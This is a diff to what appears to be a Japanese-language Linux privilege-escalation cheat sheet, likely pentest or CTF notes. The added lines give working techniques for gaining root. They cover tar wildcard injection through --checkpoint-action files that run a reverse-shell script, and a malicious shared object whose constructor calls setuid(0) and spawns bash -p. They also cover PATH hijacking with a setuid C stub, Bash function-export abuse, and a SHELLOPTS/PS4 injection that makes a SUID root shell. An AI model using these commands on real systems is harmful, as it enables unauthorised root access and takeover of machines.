@@ -55,14 +55,14 @@ sudo LD_PRELOAD=/tmp/preload.so [COMMAND]
 ```
 
 #### LD_LIBRARY_PATH が存在する場合
-1. コマンド実行時に読み込むライブラリを確認 
+1. コマンド実行時に読み込むライブラリを確認(*2)
 ```
 LD_LIBRARY_PATH=/tmp strace [COMMAND] 2>&1 | grep -iE "open|access|no such file"
 ```
 
-2. C言語のプログラムを共有ライブラリ(soファイル)にコンパイル(*2)
+2. C言語のプログラムを共有ライブラリ(soファイル)にコンパイル
 ```
-gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
+gcc -o /tmp/[SHARED OBJECT] -shared -fPIC library_path.c
 ```
 
 library_path.c
@@ -116,4 +116,83 @@ locate [FILE]
 
 ```
 
+```
+
+### ワイルドカード(*1)
+Cronに限らず、スクリプト内で実行されるコマンド（tarなど）の引数として*が使われ、かつコマンド実行先のディレクトリに書き込み権限がある場合。[FILE] にはリバースシェルを実行するスクリプトを渡す。
+```
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=[FILE]
+```
+
+### Annotation
+*1 touchコマンドの引数には絶対パスを渡さないと、--checkpoint=1, --checkpoint-action=exec=[FILE] がコマンドの引数と解釈されてエラーになる。
+
+## SUID / SGID 実行ファイル
+### 既存の脆弱性の利用
+Exim <= 4.84-3（SUID / SGIDがセットされている必要あり。もし存在すれば [CVE-2016-1531](https://www.exploit-db.com/exploits/39535) を使う。）
+
+```
+find / -type f -name exim 2>/dev/null
+```
+
+### 共有オブジェクトの利用
+SUID / SGIDがセットされており、スクリプトの置き換え、またはスクリプトの書き換えが可能な場合（ディレクトリの書き込み、またはファイルの書き込みが許可されている場合）
+```
+strace [FILE] 2>&1 | grep -iE "open|access|no such file"
+gcc -shared -fPIC -o /tmp/[SHARED OBJECT] libcalc.c
+./[FILE]
+```
+
+libcalc.c
+```
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+        setuid(0);
+        system("/bin/bash -p");
+}
+```
+
+### 環境変数
+プログラム内部で実行されているコマンドが、コマンド名で指定されている（絶対パスでない）場合
+
+```
+strings [FILE]
+gcc -o /tmp/[COMMAND] service.c
+PATH=/tmp:$PATH [FILE]
+```
+
+service.c
+```
+int main() {
+        setuid(0);
+        system("/bin/bash -p");
+}
+```
+
+### シェルの仕様 1
+Bash が ver < 4.2-048 の場合に利用可能
+
+Bash バージョン確認
+```
+/bin/bash --version
+```
+
+```
+strings [FILE]
+function [COMMAND ABSOLUTE PATH] { /bin/bash -p; }
+export -f [COMMAND ABSOLUTE PATH]
+./[FILE]
+```
+
+### シェルの仕様 2
+Bash が ver < 4.4 の場合に利用可能
+
+```
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' [FILE]
+/tmp/rootbash -p
 ```
